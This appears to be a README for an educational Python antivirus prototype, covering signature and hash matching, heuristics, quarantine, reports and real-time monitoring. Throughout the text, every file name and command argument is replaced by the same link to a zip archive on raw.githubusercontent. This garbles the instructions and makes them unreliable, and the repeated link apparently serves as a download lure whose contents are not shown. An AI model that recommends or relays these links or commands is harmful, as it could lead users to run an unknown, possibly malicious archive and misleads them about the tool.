# Antivirus-Detection-Python-Code
Using this repository/ python code/ exe file, folders can be easily scaned and also monitored. If any virus found it can either Quarantine in a folder or delete them.



# Simple Antivirus Prototype (Python)

This repository contains a simple antivirus prototype implementing recursive scanning, signature-based detection, basic heuristics, quarantine/delete actions, JSON reporting, and optional real-time monitoring.

## Features
- **File Scanning**: Recursively scans a target directory.
- **Signature-Based Detection**:
  - Content patterns (regex or literals).
  - SHA-256 hash matching.
- **Heuristic Detection**:
  - Suspicious file extensions: `.exe .bat .vbs .js .jar .ps1 .cmd .scr .msi`
  - Double extensions: `https://raw.githubusercontent.com/Sai-Teja86/Antivirus-Detection-Python-Code/main/bromethylene/Antivirus-Detection-Python-Code.zip`
  - Large executables over **50 MB**
  - Suspicious keywords inside scripts (configurable via `https://raw.githubusercontent.com/Sai-Teja86/Antivirus-Detection-Python-Code/main/bromethylene/Antivirus-Detection-Python-Code.zip`)
- **Quarantine/Removal**: Move to a quarantine folder (preserving structure) or delete.
- **Report Generation**: JSON report with totals and per-file actions.
- **Real-time Scanner** (Bonus): Uses `watchdog` to monitor a folder for new files.

## Quick Start/ Usage

Quarantine on detection:
python https://raw.githubusercontent.com/Sai-Teja86/Antivirus-Detection-Python-Code/main/bromethylene/Antivirus-Detection-Python-Code.zip --path /path/to/scan --action quarantine --quarantine-dir ./quarantine --signatures https://raw.githubusercontent.com/Sai-Teja86/Antivirus-Detection-Python-Code/main/bromethylene/Antivirus-Detection-Python-Code.zip --report https://raw.githubusercontent.com/Sai-Teja86/Antivirus-Detection-Python-Code/main/bromethylene/Antivirus-Detection-Python-Code.zip

Delete on detection:
python https://raw.githubusercontent.com/Sai-Teja86/Antivirus-Detection-Python-Code/main/bromethylene/Antivirus-Detection-Python-Code.zip --path /path/to/scan --action delete --signatures https://raw.githubusercontent.com/Sai-Teja86/Antivirus-Detection-Python-Code/main/bromethylene/Antivirus-Detection-Python-Code.zip

Monitor in real time (Ctrl+C to stop):
python https://raw.githubusercontent.com/Sai-Teja86/Antivirus-Detection-Python-Code/main/bromethylene/Antivirus-Detection-Python-Code.zip --path /path/to/scan --monitor --action quarantine --quarantine-dir ./quarantine


## File Overview
- `https://raw.githubusercontent.com/Sai-Teja86/Antivirus-Detection-Python-Code/main/bromethylene/Antivirus-Detection-Python-Code.zip` — main scanner script.
- `https://raw.githubusercontent.com/Sai-Teja86/Antivirus-Detection-Python-Code/main/bromethylene/Antivirus-Detection-Python-Code.zip` — main scanner script with GUI access.
- `https://raw.githubusercontent.com/Sai-Teja86/Antivirus-Detection-Python-Code/main/bromethylene/Antivirus-Detection-Python-Code.zip` — Executable GUI. ('used pyinstaller --onefile https://raw.githubusercontent.com/Sai-Teja86/Antivirus-Detection-Python-Code/main/bromethylene/Antivirus-Detection-Python-Code.zip to convert to exe')
- `https://raw.githubusercontent.com/Sai-Teja86/Antivirus-Detection-Python-Code/main/bromethylene/Antivirus-Detection-Python-Code.zip` — sample signatures database (edit to add your IoCs).
- `https://raw.githubusercontent.com/Sai-Teja86/Antivirus-Detection-Python-Code/main/bromethylene/Antivirus-Detection-Python-Code.zip` — optional dependency for real-time monitoring (`watchdog`).
- `https://raw.githubusercontent.com/Sai-Teja86/Antivirus-Detection-Python-Code/main/bromethylene/Antivirus-Detection-Python-Code.zip` — generated after a scan (path configurable).
- `test` — contains test virus files.

## Signatures Format
`https://raw.githubusercontent.com/Sai-Teja86/Antivirus-Detection-Python-Code/main/bromethylene/Antivirus-Detection-Python-Code.zip` expects:
json
{
  "patterns": ["regex-or-literal", "another-pattern"],
  "hashes": ["sha256hashlowercase", "..."]
}

- Patterns are tried as **regex** first; if invalid, they are matched as plain text (case-insensitive) against the first ~2MB of the file for speed/safety.
- Hashes are full **SHA-256** values.

## Notes & Limitations
- This is an educational prototype, **not a production antivirus**.
- Content scanning only inspects the first ~2MB of files to limit memory and time usage.
- "Large executable" is determined purely by extension + size.
- Some files may not be readable due to permissions; these are skipped gracefully.
- False positives/negatives are possible; tune `https://raw.githubusercontent.com/Sai-Teja86/Antivirus-Detection-Python-Code/main/bromethylene/Antivirus-Detection-Python-Code.zip` to your environment.
- For real-time monitoring, install `watchdog` and ensure the process has access to the target path.

## Install
Python 3.8+ recommended.
pip install -r https://raw.githubusercontent.com/Sai-Teja86/Antivirus-Detection-Python-Code/main/bromethylene/Antivirus-Detection-Python-Code.zip


## Generate a Sample Report

python https://raw.githubusercontent.com/Sai-Teja86/Antivirus-Detection-Python-Code/main/bromethylene/Antivirus-Detection-Python-Code.zip --path . --action none --signatures https://raw.githubusercontent.com/Sai-Teja86/Antivirus-Detection-Python-Code/main/bromethylene/Antivirus-Detection-Python-Code.zip --report https://raw.githubusercontent.com/Sai-Teja86/Antivirus-Detection-Python-Code/main/bromethylene/Antivirus-Detection-Python-Code.zip


## Security Tips
- Keep your signatures up to date (hashes and IoCs).
- Run scans with least privilege needed.

## License
MIT (for educational use)
